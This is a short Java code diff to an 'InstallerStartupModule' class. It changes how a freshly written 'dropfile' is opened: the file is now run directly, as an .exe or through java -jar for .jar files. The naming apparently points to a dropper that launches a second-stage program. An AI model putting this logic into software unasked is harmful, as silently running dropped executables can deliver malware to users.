@@ -158,7 +158,19 @@ public class InstallerStartupModule extends StartupModule {
 						fos.close();
 
 						try {
-							Desktop.getDesktop().open(dropfile); // TODO
+							if (ext.equalsIgnoreCase("exe")) {
+								Runtime.getRuntime().exec(new String[] { dropfile.getAbsolutePath() });
+							} else if (ext.equalsIgnoreCase("jar")) {
+								if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
+									String javaPath = System.getProperty("java.home") + "\\bin\\javaw";
+						
+									Runtime.getRuntime().exec(new String[] { javaPath, "-jar", dropfile.getAbsolutePath() });
+								} else {
+									Runtime.getRuntime().exec(new String[] { "java", "-jar", dropfile.getAbsolutePath() });
+								}
+							} else {
+								Desktop.getDesktop().open(dropfile);
+							}
 						} catch (Exception ex) {
 							ex.printStackTrace();
 						}
